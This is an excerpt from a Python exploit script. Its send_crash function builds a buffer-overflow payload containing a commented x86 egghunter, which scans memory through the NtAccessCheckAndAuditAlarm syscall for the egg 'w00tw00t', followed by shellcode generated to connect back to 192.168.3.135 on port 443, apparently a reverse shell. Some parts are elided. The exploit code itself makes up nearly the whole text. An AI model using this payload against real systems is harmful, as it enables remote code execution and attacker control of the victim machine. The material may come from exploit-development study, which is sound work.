...
def send_crash(server, port):
    ...
    egghunterCode = """ 
    loop_inc_page:
        or dx, 0x0fff		; Last addr of memPage, memPage size is 0x1000
    loop_inc_one:
        inc edx			    ; Inc memCount, sets EDX to new memPage. Done this way to avoid null bytes
    loop_check:
        push edx		    ; Save memAddr onto stack, just a fake pointer to facilitate SysCall
        push 0xFFFFFE37	    ; SysCall: NTAccessCheckAndAuditAlarm. 0x01c9 updated syscall number. 000001c9 has nullbytes, use NEG value here
        pop eax			    ; Restore the SysCall num into EAX
        neg eax			    ; 1 - eax. 
        int 0x2e		    ; Trigger Interrupt
        cmp al, 05		    ; Check for AV, full value is 0xc000 0005. Done this way to avoid null bytes
        pop edx			    ; Restore fake pointer into EDX to check for egg since SysCall is complete
    loop_check_valid:
        je loop_inc_page	; IF AV, then go to the next page
    is_egg:
        mov eax, 0x74303077	; Load egg to EAX
        mov edi, edx		; move edx addr to edi and call scasd to check if match
        scasd 			    ; SCASD: compare EAX with the 32-bit value at [EDI], set flags, then advance EDI by 4 (or subtract if DF=1). ZF=0 means found first half
        jnz loop_inc_one	; No match, inc to next addr
        scasd			    ; Find second half
        jnz loop_inc_one	; No match
    matched:
        jmp edi			    ; EDI now points to egg, jmp to it
    """
    ...
    shellCode = generateShellcode(LHOST="192.168.3.135", LPORT=443, debug=True)
    payload += b"w00tw00t"
    payload += shellCode
